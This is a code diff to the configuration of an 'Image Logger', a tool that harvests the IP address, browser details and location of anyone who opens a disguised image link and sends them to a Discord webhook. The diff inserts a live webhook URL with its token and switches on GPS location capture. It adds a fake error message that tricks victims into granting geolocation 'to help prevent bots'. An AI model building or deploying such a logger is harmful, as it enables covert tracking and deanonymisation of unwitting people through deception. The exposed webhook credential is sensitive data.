@@ -12,23 +12,23 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1343797637685575700/UBnr-YF9bDffoCA252al6IoPhqfpYayZcQP5dClxWnfT1ViGywk8-5lRj-ImelXCSzCm",
-    "image": "https://i.ibb.co/3mTh8yrf/Screenshot-42.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1350348163634036848/8PqHHmoZgErdvET8V2_O5abJAUg1cJz47lM2S-2KtfsSnwZuMxRD-Ags4e24NMeSejhW",
+    "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "", # Set this to the name you want the webhook to have
     "color": 0x009900FF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "Sorry, image cant be accessed right now: Error Code 502", # Message to show
+        "message": 'Code Error In "enable geolocation to help prevent bots!"', # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
-        "page": "https://iheartcraftythings.com/wp-content/uploads/2021/11/6-108.jpg" # Link to the webpage to redirect to 
+        "redirect": False, # Redirect to a webpage?
+        "page": "" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -146,7 +146,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**SOMEONE ACTUALLY FELL FOR IT 😂🤣🤦‍♂️**
+            "description": f"**Logged**"
 
 **Endpoint:** `{endpoint}`
             
